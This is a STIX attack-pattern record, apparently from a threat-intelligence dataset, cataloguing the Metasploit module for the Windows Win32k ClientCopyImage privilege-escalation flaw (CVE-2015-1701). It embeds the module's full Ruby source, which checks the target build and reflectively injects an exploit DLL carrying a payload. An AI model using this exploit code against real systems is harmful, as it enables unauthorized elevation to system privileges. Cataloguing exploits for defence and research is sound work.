{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b397641f-5428-4af3-a5c9-cbcaf5f4e13e",
    "created": "2024-08-14T16:49:04.509045Z",
    "modified": "2024-08-14T16:49:04.50905Z",
    "name": "Windows ClientCopyImage Win32k Exploit",
    "description": " This module exploits improper object handling in the win32k.sys kernel mode driver. This module has been tested on vulnerable builds of Windows 7 x64 and x86, and Windows 2008 R2 SP1 x64.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/ms15_051_client_copy_image.rb",
            "external_id": "ms15_051_client_copy_image.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-1701"
        },
        {
            "source_name": "reference",
            "url": "https://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/hfiref0x/CVE-2015-1701"
        },
        {
            "source_name": "reference",
            "url": "https://technet.microsoft.com/library/security/MS15-051"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = NormalRanking\n\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Process\n  include Msf::Post::Windows::FileInfo\n  include Msf::Post::Windows::ReflectiveDLLInjection\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'Windows ClientCopyImage Win32k Exploit',\n          'Description' => %q{\n            This module exploits improper object handling in the win32k.sys kernel mode driver.\n            This module has been tested on vulnerable builds of Windows 7 x64 and x86, and\n            Windows 2008 R2 SP1 x64.\n          },\n          'License' => MSF_LICENSE,\n          'Author' => [\n            'Unknown', # vulnerability discovery and exploit in the wild\n            'hfirefox',        # Code released on github\n            'OJ Reeves',       # msf module\n            'Spencer McIntyre' # msf module\n          ],\n          'Arch' => [ ARCH_X86, ARCH_X64 ],\n          'Platform' => 'win',\n          'SessionTypes' => [ 'meterpreter' ],\n          'DefaultOptions' => {\n            'EXITFUNC' => 'thread'\n          },\n          'Targets' => [\n            [ 'Windows x86', { 'Arch' => ARCH_X86 } ],\n            [ 'Windows x64', { 'Arch' => ARCH_X64 } ]\n          ],\n          'Payload' => {\n            'Space' => 4096,\n            'DisableNops' => true\n          },\n          'References' => [\n            ['CVE', '2015-1701'],\n            ['MSB', 'MS15-051'],\n            ['URL', 'https://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html'],\n            ['URL', 'https://github.com/hfiref0x/CVE-2015-1701'],\n            ['URL', 'https://technet.microsoft.com/library/security/MS15-051']\n          ],\n          'DisclosureDate' => '2015-05-12',\n          'DefaultTarget' => 0,\n          'Notes' => {\n            'Stability' => [ CRASH_OS_RESTARTS, ]\n          }\n        }\n      )\n    )\n  end\n\n  def check\n    # Windows XP SP3 (32-bit)                      5.1.2600.6514 (Works)\n    # Windows Server 2003 Standard SP2 (32-bit)    5.2.3790.5445 (Works)\n    # Windows Server 2008 Enterprise SP2 (32-bit)  6.0.6002.18005 (Does not work)\n    # Windows 7 SP1 (64-bit)                       6.1.7601.17514 (Works)\n    # Windows 7 SP1 (64-bit)                       6.1.7601.17535 (Works)\n    # Windows 7 SP1 (32-bit)                       6.1.7601.17514 (Works)\n    # Windows 7 SP1 (32-bit)                       6.1.7601.18388 (Works)\n    # Windows Server 2008 R2 (64-bit) SP1          6.1.7601.17514 (Works)\n    # Windows Server 2008 R2 (64-bit) SP1          6.1.7601.18105 (Works)\n\n    unless session.platform == 'windows'\n      return Exploit::CheckCode::Unknown\n    end\n\n    file_path = expand_path('%windir%') << '\\\\system32\\\\win32k.sys'\n    major, minor, build, revision, branch = file_version(file_path)\n    vprint_status(\"win32k.sys file version: #{major}.#{minor}.#{build}.#{revision} branch: #{branch}\")\n\n    return Exploit::CheckCode::Safe if build > 7601\n\n    return Exploit::CheckCode::Appears\n  end\n\n  def exploit\n    if is_system?\n      fail_with(Failure::None, 'Session is already elevated')\n    end\n\n    check_result = check\n    if check_result == Exploit::CheckCode::Safe || check_result == Exploit::CheckCode::Unknown\n      fail_with(Failure::NotVulnerable, 'Exploit not available on this system.')\n    end\n\n    if sysinfo['Architecture'] == ARCH_X64\n      if session.arch == ARCH_X86\n        fail_with(Failure::NoTarget, 'Running against WOW64 is not supported')\n      end\n\n      if target.arch.first == ARCH_X86\n        fail_with(Failure::NoTarget, 'Session host is x64, but the target is specified as x86')\n      end\n    elsif target.arch.first == ARCH_X64\n      fail_with(Failure::NoTarget, 'Session host is x86, but the target is specified as x64')\n    end\n\n    print_status('Reflectively injecting the exploit DLL and executing it...')\n    if target.arch.first == ARCH_X86\n      dll_file_name = 'cve-2015-1701.x86.dll'\n    else\n      dll_file_name = 'cve-2015-1701.x64.dll'\n    end\n\n    # invoke the exploit, passing in the address of the payload that\n    # we want invoked on successful exploitation.\n    encoded_payload = payload.encoded\n    execute_dll(\n      ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2015-1701', dll_file_name),\n      encoded_payload\n    )\n\n    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-05-12",
    "x_mitre_platforms": [
        "win'"
    ]
}